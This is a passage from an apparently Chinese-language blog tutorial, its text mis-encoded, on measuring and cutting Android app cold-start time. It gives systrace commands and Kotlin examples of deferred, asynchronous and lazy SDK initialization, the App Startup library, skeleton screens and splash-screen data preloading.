<span class="hljs-comment"># 2. åå°å¯åŠ¨systrace</span>
python systrace.py -t 10 -o launch.html \
    <span class="hljs-built_in">sched</span> freq gfx view wm am dalvik res \
    -a com.example.myapp &amp;

<span class="hljs-comment"># 3. ç­‰å¾…2ç§’è®©systraceå‡†å¤‡å¥½</span>
<span class="hljs-built_in">sleep</span> 2

<span class="hljs-comment"># 4. å¯åŠ¨App</span>
adb shell am start-activity -W com.example.myapp/.MainActivity

<span class="hljs-comment"># 5. æ‰“å¼€traceåˆ†æ</span>
google-chrome launch.html
</code></pre>
<p><strong>Traceä¸­æŸ¥æ‰¾å…³é”®æ—¶é—´ç‚¹</strong>:</p>
<ul>
<li><code>bindApplication</code>: Applicationå¼€å§‹åˆ›å»º</li>
<li><code>activityStart</code>: Activityå¼€å§‹å¯åŠ¨</li>
<li><code>Choreographer#doFrame</code>: é¦–å¸§å¼€å§‹æ¸²æŸ“</li>
<li><code>reportFullyDrawn</code>: åº”ç”¨è‡ªå·±ä¸ŠæŠ¥çš„å¯åŠ¨å®Œæˆæ—¶é—´</li>
</ul>
<h4 data-id="heading-30">æ–¹æ³•3: ä»£ç ä¸­ç²¾ç¡®è®¡æ—¶</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// MyApplication.kt</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MyApp</span> : <span class="hljs-type">Application</span>() {
    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
        <span class="hljs-keyword">var</span> appStartTime = <span class="hljs-number">0L</span>
        <span class="hljs-keyword">var</span> appCreateTime = <span class="hljs-number">0L</span>
    }

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">attachBaseContext</span><span class="hljs-params">(base: <span class="hljs-type">Context</span>)</span></span> {
        <span class="hljs-keyword">super</span>.attachBaseContext(base)
        appStartTime = System.currentTimeMillis()
    }

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">super</span>.onCreate()

        <span class="hljs-comment">// Applicationåˆå§‹åŒ–æ“ä½œ</span>
        initSDKs()

        appCreateTime = System.currentTimeMillis() - appStartTime
        Log.d(<span class="hljs-string">"LaunchTime"</span>, <span class="hljs-string">"Application.onCreateè€—æ—¶: <span class="hljs-subst">${appCreateTime}</span>ms"</span>)
    }
}

<span class="hljs-comment">// MainActivity.kt</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> : <span class="hljs-type">AppCompatActivity</span>() {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(savedInstanceState: <span class="hljs-type">Bundle</span>?)</span></span> {
        <span class="hljs-keyword">val</span> activityStartTime = System.currentTimeMillis()
        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        <span class="hljs-keyword">val</span> activityCreateTime = System.currentTimeMillis() - activityStartTime
        Log.d(<span class="hljs-string">"LaunchTime"</span>, <span class="hljs-string">"Activity.onCreateè€—æ—¶: <span class="hljs-subst">${activityCreateTime}</span>ms"</span>)

        <span class="hljs-comment">// ç­‰å¾…é¦–å¸§æ¸²æŸ“å®Œæˆ</span>
        window.decorView.viewTreeObserver.addOnPreDrawListener(
            <span class="hljs-keyword">object</span> : ViewTreeObserver.OnPreDrawListener {
                <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onPreDraw</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Boolean</span> {
                    window.decorView.viewTreeObserver.removeOnPreDrawListener(<span class="hljs-keyword">this</span>)

                    <span class="hljs-keyword">val</span> totalTime = System.currentTimeMillis() - MyApp.appStartTime
                    <span class="hljs-keyword">val</span> renderTime = System.currentTimeMillis() - activityStartTime

                    Log.d(<span class="hljs-string">"LaunchTime"</span>, <span class="hljs-string">"""
                        ==== å¯åŠ¨æ€§èƒ½ç»Ÿè®¡ ====
                        Applicationè€—æ—¶: <span class="hljs-subst">${MyApp.appCreateTime}</span>ms
                        Activityè€—æ—¶: <span class="hljs-subst">${activityCreateTime}</span>ms
                        é¦–å¸§æ¸²æŸ“è€—æ—¶: <span class="hljs-subst">${renderTime - activityCreateTime}</span>ms
                        æ€»å¯åŠ¨æ—¶é—´: <span class="hljs-subst">${totalTime}</span>ms
                        ======================
                    """</span>.trimIndent())

                    <span class="hljs-comment">// ä¸ŠæŠ¥åˆ°æœåŠ¡å™¨</span>
                    reportLaunchTime(totalTime)

                    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>
                }
            }
        )
    }

    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">reportLaunchTime</span><span class="hljs-params">(time: <span class="hljs-type">Long</span>)</span></span> {
        <span class="hljs-comment">// ä¸ŠæŠ¥å¯åŠ¨æ—¶é—´åˆ°Firebase/è‡ªå»ºæœåŠ¡å™¨</span>
        FirebasePerformance.getInstance()
            .newTrace(<span class="hljs-string">"cold_start"</span>)
            .apply {
                putMetric(<span class="hljs-string">"duration_ms"</span>, time)
                start()
                stop()
            }
    }
}
</code></pre>
<h3 data-id="heading-31">3.2 Application.onCreate()ä¼˜åŒ–</h3>
<p>Application.onCreate()æ˜¯å†·å¯åŠ¨çš„ç¬¬ä¸€ä¸ªç“¶é¢ˆ,å¾ˆå¤šå¼€å‘è€…ä¹ æƒ¯åœ¨è¿™é‡Œåˆå§‹åŒ–å„ç§SDK,å¯¼è‡´å¯åŠ¨ç¼“æ…¢ã€‚</p>
<h4 data-id="heading-32">åé¢æ¡ˆä¾‹:å…¸å‹çš„æ…¢Application</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// âŒ ç³Ÿç³•çš„Applicationå®ç°</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">BadApplication</span> : <span class="hljs-type">Application</span>() {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">super</span>.onCreate()

        <span class="hljs-comment">// é—®é¢˜1: åŒæ­¥åˆå§‹åŒ–å¤šä¸ªç¬¬ä¸‰æ–¹SDK (è€—æ—¶500ms+)</span>
        BuglySDK.<span class="hljs-keyword">init</span>(<span class="hljs-keyword">this</span>, <span class="hljs-string">"app_id"</span>, <span class="hljs-literal">false</span>)  <span class="hljs-comment">// 180ms</span>
        UmengSDK.<span class="hljs-keyword">init</span>(<span class="hljs-keyword">this</span>, <span class="hljs-string">"umeng_key"</span>)      <span class="hljs-comment">// 150ms</span>
        WeChatSDK.registerApp(<span class="hljs-string">"wx_app_id"</span>)    <span class="hljs-comment">// 200ms</span>

        <span class="hljs-comment">// é—®é¢˜2: åŒæ­¥æ•°æ®åº“æ“ä½œ (è€—æ—¶150ms)</span>
        DatabaseHelper.getInstance(<span class="hljs-keyword">this</span>).<span class="hljs-keyword">init</span>()

        <span class="hljs-comment">// é—®é¢˜3: åŒæ­¥æ–‡ä»¶I/O (è€—æ—¶100ms)</span>
        ConfigManager.loadFromDisk(<span class="hljs-keyword">this</span>)

        <span class="hljs-comment">// é—®é¢˜4: å¤æ‚çš„åˆå§‹åŒ–é€»è¾‘ (è€—æ—¶200ms)</span>
        initGlobalConfig()
        preloadAssets()

        <span class="hljs-comment">// æ€»è€—æ—¶: 1000ms+</span>
        <span class="hljs-comment">// ç”¨æˆ·ä½“éªŒ: ç™½å±1ç§’,å¾ˆç³Ÿç³•</span>
    }
}
</code></pre>
<h4 data-id="heading-33">ä¼˜åŒ–ç­–ç•¥1: å»¶è¿Ÿåˆå§‹åŒ– (Lazy Initialization)</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// âœ… ä¼˜åŒ–å: åªåˆå§‹åŒ–å¿…é¡»çš„</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">GoodApplication</span> : <span class="hljs-type">Application</span>() {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">super</span>.onCreate()

        <span class="hljs-comment">// åªåˆå§‹åŒ–å´©æºƒä¸ŠæŠ¥ (å¿…é¡»ç«‹å³åˆå§‹åŒ–,å¦åˆ™æ•è·ä¸åˆ°æ—©æœŸå´©æºƒ)</span>
        BuglySDK.<span class="hljs-keyword">init</span>(<span class="hljs-keyword">this</span>, <span class="hljs-string">"app_id"</span>, <span class="hljs-literal">false</span>)  <span class="hljs-comment">// 180ms</span>

        <span class="hljs-comment">// å…¶ä»–SDKåœ¨ä¸»çº¿ç¨‹ç©ºé—²æ—¶åˆå§‹åŒ–</span>
        Looper.myQueue().addIdleHandler {
            Thread {
                delayedInit()
            }.start()
            <span class="hljs-literal">false</span>  <span class="hljs-comment">// åªæ‰§è¡Œä¸€æ¬¡</span>
        }

        <span class="hljs-comment">// Application.onCreateè€—æ—¶: 180ms (å‡å°‘82%)</span>
    }

    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">delayedInit</span><span class="hljs-params">()</span></span> {
        <span class="hljs-comment">// å»¶è¿Ÿ5ç§’ååˆå§‹åŒ–éå…³é”®SDK</span>
        Thread.sleep(<span class="hljs-number">5000</span>)
        UmengSDK.<span class="hljs-keyword">init</span>(<span class="hljs-keyword">this</span>, <span class="hljs-string">"umeng_key"</span>)
        WeChatSDK.registerApp(<span class="hljs-string">"wx_app_id"</span>)
        DatabaseHelper.getInstance(<span class="hljs-keyword">this</span>).<span class="hljs-keyword">init</span>()
        ConfigManager.loadFromDisk(<span class="hljs-keyword">this</span>)
    }
}
</code></pre>
<p><strong>IdleHandleråŸç†</strong>:</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Looper.myQueue().addIdleHandler ä¼šåœ¨ä¸»çº¿ç¨‹ç©ºé—²æ—¶æ‰§è¡Œ</span>
<span class="hljs-comment">// å³: MessageQueueä¸­æ²¡æœ‰æ¶ˆæ¯éœ€è¦å¤„ç†æ—¶</span>

<span class="hljs-comment">// å®ç°åŸç†(ç®€åŒ–ç‰ˆ):</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MessageQueue</span> {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">next</span><span class="hljs-params">()</span></span>: Message? {
        <span class="hljs-comment">// ... è·å–ä¸‹ä¸€ä¸ªæ¶ˆæ¯</span>

        <span class="hljs-comment">// å¦‚æœæ²¡æœ‰æ¶ˆæ¯,æ‰§è¡ŒIdleHandler</span>
        <span class="hljs-keyword">if</span> (message == <span class="hljs-literal">null</span> &amp;&amp; idleHandlers.isNotEmpty()) {
            <span class="hljs-keyword">for</span> (handler <span class="hljs-keyword">in</span> idleHandlers) {
                handler.queueIdle()
            }
        }

        <span class="hljs-keyword">return</span> message
    }
}
</code></pre>
<h4 data-id="heading-34">ä¼˜åŒ–ç­–ç•¥2: å¼‚æ­¥åˆå§‹åŒ– (Async Initialization)</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// âœ… æ›´å¥½çš„æ–¹æ¡ˆ: å¹¶è¡Œå¼‚æ­¥åˆå§‹åŒ–</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">BetterApplication</span> : <span class="hljs-type">Application</span>() {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> initExecutor = Executors.newFixedThreadPool(<span class="hljs-number">3</span>)

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">super</span>.onCreate()

        <span class="hljs-comment">// å´©æºƒä¸ŠæŠ¥å¿…é¡»åŒæ­¥åˆå§‹åŒ–</span>
        BuglySDK.<span class="hljs-keyword">init</span>(<span class="hljs-keyword">this</span>, <span class="hljs-string">"app_id"</span>, <span class="hljs-literal">false</span>)  <span class="hljs-comment">// 180ms</span>

        <span class="hljs-comment">// å…¶ä»–SDKå¼‚æ­¥å¹¶è¡Œåˆå§‹åŒ–</span>
        initExecutor.submit { UmengSDK.<span class="hljs-keyword">init</span>(<span class="hljs-keyword">this</span>, <span class="hljs-string">"umeng_key"</span>) }      <span class="hljs-comment">// 150ms</span>
        initExecutor.submit { WeChatSDK.registerApp(<span class="hljs-string">"wx_app_id"</span>) }    <span class="hljs-comment">// 200ms</span>
        initExecutor.submit { DatabaseHelper.getInstance(<span class="hljs-keyword">this</span>).<span class="hljs-keyword">init</span>() }  <span class="hljs-comment">// 150ms</span>

        <span class="hljs-comment">// Application.onCreateè€—æ—¶: 180ms</span>
        <span class="hljs-comment">// å…¶ä»–SDKåœ¨åå°å¹¶è¡Œåˆå§‹åŒ–,äº’ä¸é˜»å¡</span>
    }
}
</code></pre>
<h4 data-id="heading-35">ä¼˜åŒ–ç­–ç•¥3: æ‡’åŠ è½½ (Lazy Loading)</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// âœ… æœ€ä½³æ–¹æ¡ˆ: æŒ‰éœ€åŠ è½½</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">BestApplication</span> : <span class="hljs-type">Application</span>() {
    <span class="hljs-comment">// ä½¿ç”¨Kotlinçš„lazyå§”æ‰˜,é¦–æ¬¡ä½¿ç”¨æ—¶æ‰åˆå§‹åŒ–</span>
    <span class="hljs-keyword">val</span> database <span class="hljs-keyword">by</span> lazy {
        DatabaseHelper.getInstance(<span class="hljs-keyword">this</span>).apply { <span class="hljs-keyword">init</span>() }
    }

    <span class="hljs-keyword">val</span> config <span class="hljs-keyword">by</span> lazy {
        ConfigManager.loadFromDisk(<span class="hljs-keyword">this</span>)
    }

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">super</span>.onCreate()

        <span class="hljs-comment">// åªåˆå§‹åŒ–å´©æºƒä¸ŠæŠ¥</span>
        BuglySDK.<span class="hljs-keyword">init</span>(<span class="hljs-keyword">this</span>, <span class="hljs-string">"app_id"</span>, <span class="hljs-literal">false</span>)  <span class="hljs-comment">// 180ms</span>

        <span class="hljs-comment">// Application.onCreateè€—æ—¶: 180ms (å‡å°‘82%)</span>
        <span class="hljs-comment">// databaseå’Œconfigåªåœ¨é¦–æ¬¡ä½¿ç”¨æ—¶æ‰åˆå§‹åŒ–</span>
    }
}

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> : <span class="hljs-type">AppCompatActivity</span>() {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(savedInstanceState: <span class="hljs-type">Bundle</span>?)</span></span> {
        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState)

        <span class="hljs-comment">// é¦–æ¬¡è®¿é—®æ—¶æ‰åˆå§‹åŒ–database</span>
        <span class="hljs-keyword">val</span> app = application <span class="hljs-keyword">as</span> BestApplication
        <span class="hljs-keyword">val</span> user = app.database.getUserInfo()  <span class="hljs-comment">// æ­¤æ—¶æ‰æ‰§è¡Œæ•°æ®åº“åˆå§‹åŒ–</span>
    }
}
</code></pre>
<h4 data-id="heading-36">ä¼˜åŒ–ç­–ç•¥4: å¯åŠ¨å™¨æ¨¡å¼ (Startup Library)</h4>
<p>ä½¿ç”¨Googleçš„App Startupåº“ç®¡ç†åˆå§‹åŒ–æµç¨‹:</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// build.gradle</span>
dependencies {
    implementation <span class="hljs-string">"androidx.startup:startup-runtime:1.1.1"</span>
}
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// å®šä¹‰åˆå§‹åŒ–å™¨</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">UmengInitializer</span> : <span class="hljs-type">Initializer</span>&lt;<span class="hljs-type">Unit</span>&gt; {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">create</span><span class="hljs-params">(context: <span class="hljs-type">Context</span>)</span></span> {
        UmengSDK.<span class="hljs-keyword">init</span>(context, <span class="hljs-string">"umeng_key"</span>)
    }

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">dependencies</span><span class="hljs-params">()</span></span>: List&lt;Class&lt;<span class="hljs-keyword">out</span> Initializer&lt;*&gt;&gt;&gt; {
        <span class="hljs-comment">// å£°æ˜ä¾èµ–å…³ç³»</span>
        <span class="hljs-keyword">return</span> emptyList()
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">DatabaseInitializer</span> : <span class="hljs-type">Initializer</span>&lt;<span class="hljs-type">Unit</span>&gt; {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">create</span><span class="hljs-params">(context: <span class="hljs-type">Context</span>)</span></span> {
        DatabaseHelper.getInstance(context).<span class="hljs-keyword">init</span>()
    }

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">dependencies</span><span class="hljs-params">()</span></span>: List&lt;Class&lt;<span class="hljs-keyword">out</span> Initializer&lt;*&gt;&gt;&gt; {
        <span class="hljs-keyword">return</span> emptyList()
    }
}
</code></pre>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- AndroidManifest.xml --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">provider</span>
    <span class="hljs-attr">android:name</span>=<span class="hljs-string">"androidx.startup.InitializationProvider"</span>
    <span class="hljs-attr">android:authorities</span>=<span class="hljs-string">"${applicationId}.androidx-startup"</span>
    <span class="hljs-attr">android:exported</span>=<span class="hljs-string">"false"</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">meta-data</span>
        <span class="hljs-attr">android:name</span>=<span class="hljs-string">"com.example.UmengInitializer"</span>
        <span class="hljs-attr">android:value</span>=<span class="hljs-string">"androidx.startup"</span> /&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">meta-data</span>
        <span class="hljs-attr">android:name</span>=<span class="hljs-string">"com.example.DatabaseInitializer"</span>
        <span class="hljs-attr">android:value</span>=<span class="hljs-string">"androidx.startup"</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">provider</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Applicationä¸­ä¸éœ€è¦æ‰‹åŠ¨åˆå§‹åŒ–,Startupåº“ä¼šè‡ªåŠ¨æŒ‰ä¾èµ–é¡ºåºåˆå§‹åŒ–</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MyApp</span> : <span class="hljs-type">Application</span>() {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">super</span>.onCreate()
        <span class="hljs-comment">// åªéœ€è¦åˆå§‹åŒ–å´©æºƒä¸ŠæŠ¥</span>
        BuglySDK.<span class="hljs-keyword">init</span>(<span class="hljs-keyword">this</span>, <span class="hljs-string">"app_id"</span>, <span class="hljs-literal">false</span>)
    }
}
</code></pre>
<p><strong>Applicationä¼˜åŒ–æ•ˆæœå¯¹æ¯”</strong>:</p>















































<table><thead><tr><th align="left">æ–¹æ¡ˆ</th><th align="right">Applicationè€—æ—¶</th><th align="right">ä¼˜åŒ–å¹…åº¦</th><th align="left">ç”¨æˆ·ä½“éªŒ</th><th align="left">å®ç°éš¾åº¦</th></tr></thead><tbody><tr><td align="left">åŸå§‹æ–¹æ¡ˆ</td><td align="right">1000ms</td><td align="right">-</td><td align="left">ç™½å±1ç§’</td><td align="left">ç®€å•</td></tr><tr><td align="left">å»¶è¿Ÿåˆå§‹åŒ–</td><td align="right">180ms</td><td align="right">â¬‡ï¸ 82%</td><td align="left">å‡ ä¹æ— æ„ŸçŸ¥</td><td align="left">ç®€å•</td></tr><tr><td align="left">å¼‚æ­¥åˆå§‹åŒ–</td><td align="right">180ms</td><td align="right">â¬‡ï¸ 82%</td><td align="left">å‡ ä¹æ— æ„ŸçŸ¥</td><td align="left">ä¸­ç­‰</td></tr><tr><td align="left">æ‡’åŠ è½½</td><td align="right">180ms</td><td align="right">â¬‡ï¸ 82%</td><td align="left">å‡ ä¹æ— æ„ŸçŸ¥</td><td align="left">ç®€å•</td></tr><tr><td align="left">Startupåº“</td><td align="right">180ms</td><td align="right">â¬‡ï¸ 82%</td><td align="left">å‡ ä¹æ— æ„ŸçŸ¥</td><td align="left">ä¸­ç­‰</td></tr></tbody></table>
<h3 data-id="heading-37">3.3 Activity.onCreate()ä¼˜åŒ–</h3>
<p>Activity.onCreate()æ˜¯å†·å¯åŠ¨çš„ç¬¬äºŒä¸ªç“¶é¢ˆ,ä¸»è¦è€—æ—¶åœ¨æ•°æ®åŠ è½½å’ŒUIæ¸²æŸ“ã€‚</p>
<h4 data-id="heading-38">åé¢æ¡ˆä¾‹:å…¸å‹çš„æ…¢Activity</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// âŒ ç³Ÿç³•çš„Activityå®ç°</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">BadActivity</span> : <span class="hljs-type">AppCompatActivity</span>() {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(savedInstanceState: <span class="hljs-type">Bundle</span>?)</span></span> {
        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        <span class="hljs-comment">// é—®é¢˜1: ä¸»çº¿ç¨‹åŒæ­¥ç½‘ç»œè¯·æ±‚ (è€—æ—¶400ms)</span>
        <span class="hljs-keyword">val</span> userInfo = NetworkApi.getUserInfoSync()  <span class="hljs-comment">// é˜»å¡ä¸»çº¿ç¨‹!</span>

        <span class="hljs-comment">// é—®é¢˜2: ä¸»çº¿ç¨‹åŒæ­¥æ•°æ®åº“æŸ¥è¯¢ (è€—æ—¶200ms)</span>
        <span class="hljs-keyword">val</span> products = DatabaseHelper.queryProducts()

        <span class="hljs-comment">// é—®é¢˜3: å¤æ‚çš„RecyclerViewåˆå§‹åŒ– (è€—æ—¶300ms)</span>
        recyclerView.adapter = ComplexAdapter(products)
        recyclerView.layoutManager = GridLayoutManager(<span class="hljs-keyword">this</span>, <span class="hljs-number">2</span>)

        <span class="hljs-comment">// é—®é¢˜4: åŠ è½½30å¼ å¤§å›¾ç‰‡ (è€—æ—¶500ms)</span>
        loadAllImages(products)

        <span class="hljs-comment">// Activity.onCreateè€—æ—¶: 1400ms</span>
        <span class="hljs-comment">// åŠ ä¸ŠApplication 180ms = æ€»å¯åŠ¨æ—¶é—´ 1580ms</span>
        <span class="hljs-comment">// ç”¨æˆ·ä½“éªŒ: ç™½å±1.6ç§’,éå¸¸ç³Ÿç³•</span>
    }
}
</code></pre>
<h4 data-id="heading-39">ä¼˜åŒ–ç­–ç•¥1: å¼‚æ­¥åŠ è½½æ•°æ®</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// âœ… ä¼˜åŒ–å: å¼‚æ­¥åŠ è½½,å…ˆæ˜¾ç¤ºå ä½</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">GoodActivity</span> : <span class="hljs-type">AppCompatActivity</span>() {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(savedInstanceState: <span class="hljs-type">Bundle</span>?)</span></span> {
        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        <span class="hljs-comment">// å…ˆæ˜¾ç¤ºéª¨æ¶å±/å ä½UI</span>
        showSkeletonScreen()

        <span class="hljs-comment">// å¼‚æ­¥åŠ è½½æ•°æ®</span>
        lifecycleScope.launch {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// åœ¨IOçº¿ç¨‹åŠ è½½æ•°æ®</span>
                <span class="hljs-keyword">val</span> userInfo = withContext(Dispatchers.IO) {
                    NetworkApi.getUserInfoSync()
                }

                <span class="hljs-keyword">val</span> products = withContext(Dispatchers.IO) {
                    DatabaseHelper.queryProducts()
                }

                <span class="hljs-comment">// åˆ‡å›ä¸»çº¿ç¨‹æ›´æ–°UI</span>
                withContext(Dispatchers.Main) {
                    hideSkeletonScreen()
                    updateUI(userInfo, products)
                }
            } <span class="hljs-keyword">catch</span> (e: Exception) {
                showError(e)
            }
        }

        <span class="hljs-comment">// Activity.onCreateè€—æ—¶: 80ms (åªæ¸²æŸ“éª¨æ¶å±)</span>
        <span class="hljs-comment">// æ•°æ®åœ¨åå°åŠ è½½,ä¸é˜»å¡å¯åŠ¨</span>
    }

    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">showSkeletonScreen</span><span class="hljs-params">()</span></span> {
        <span class="hljs-comment">// æ˜¾ç¤ºéª¨æ¶å±åŠ¨ç”»</span>
        skeletonView.visibility = View.VISIBLE
        contentView.visibility = View.GONE
    }

    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">hideSkeletonScreen</span><span class="hljs-params">()</span></span> {
        skeletonView.visibility = View.GONE
        contentView.visibility = View.VISIBLE
    }
}
</code></pre>
<h4 data-id="heading-40">ä¼˜åŒ–ç­–ç•¥2: æ•°æ®é¢„åŠ è½½</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// åœ¨SplashActivityé¢„åŠ è½½æ•°æ®</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">SplashActivity</span> : <span class="hljs-type">AppCompatActivity</span>() {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(savedInstanceState: <span class="hljs-type">Bundle</span>?)</span></span> {
        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState)
        setContentView(R.layout.activity_splash)

        <span class="hljs-comment">// åœ¨æ˜¾ç¤ºSplashçš„åŒæ—¶,é¢„åŠ è½½æ•°æ®</span>
        lifecycleScope.launch {
            <span class="hljs-comment">// å¹¶è¡Œé¢„åŠ è½½å¤šä¸ªæ•°æ®æº</span>
            <span class="hljs-keyword">val</span> userInfoDeferred = async(Dispatchers.IO) {
                NetworkApi.getUserInfoSync()
            }

            <span class="hljs-keyword">val</span> configDeferred = async(Dispatchers.IO) {
                NetworkApi.getConfig()
            }

            <span class="hljs-keyword">val</span> productsDeferred = async(Dispatchers.IO) {
                DatabaseHelper.queryProducts()
            }

            <span class="hljs-comment">// ç­‰å¾…æ‰€æœ‰æ•°æ®åŠ è½½å®Œæˆ</span>
            <span class="hljs-keyword">val</span> userInfo = userInfoDeferred.await()
            <span class="hljs-keyword">val</span> config = configDeferred.await()
            <span class="hljs-keyword">val</span> products = productsDeferred.await()

            <span class="hljs-comment">// ç¼“å­˜åˆ°å…¨å±€å•ä¾‹</span>
            DataCache.userInfo = userInfo
            DataCache.config = config
            DataCache.products = products

            <span class="hljs-comment">// å»¶è¿Ÿ1ç§’(å±•ç¤ºSplash),ç„¶åè·³è½¬ä¸»é¡µ</span>
            delay(<span class="hljs-number">1000</span>)
            startActivity(Intent(<span class="hljs-keyword">this</span><span class="hljs-symbol">@SplashActivity</span>, MainActivity::<span class="hljs-keyword">class</span>.java))
            finish()
        }
    }
}

<span class="hljs-comment">// MainActivityç›´æ¥ä½¿ç”¨ç¼“å­˜æ•°æ®</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> : <span class="hljs-type">AppCompatActivity</span>() {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(savedInstanceState: <span class="hljs-type">Bundle</span>?)</span></span> {
        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        <span class="hljs-comment">// ç›´æ¥ä½¿ç”¨é¢„åŠ è½½çš„æ•°æ®,æ— éœ€ç­‰å¾…</span>
        <span class="hljs-keyword">val</span> userInfo = DataCache.userInfo
        <span class="hljs-keyword">val</span> products = DataCache.products

        <span class="hljs-keyword">if</span> (userInfo != <span class="hljs-literal">null</span> &amp;&amp; products != <span class="hljs-literal">null</span>) {
            updateUI(userInfo, products)
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// é™çº§æ–¹æ¡ˆ:æ•°æ®æœªå‡†å¤‡å¥½,å¼‚æ­¥åŠ è½½</span>
            loadDataAsync()
        }

        <span class="hljs-comment">// Activity.onCreateè€—æ—¶: 80ms</span>
        <span class="hljs-comment">// æ€»å¯åŠ¨æ—¶é—´: 180ms + 80ms = 260ms (ä¼˜åŒ–å‰1580ms,å‡å°‘83%)</span>
    }
}
</code></pre>
<h4 data-id="heading-41">ä¼˜åŒ–ç­–ç•¥3: å¸ƒå±€ä¼˜åŒ–</h4>
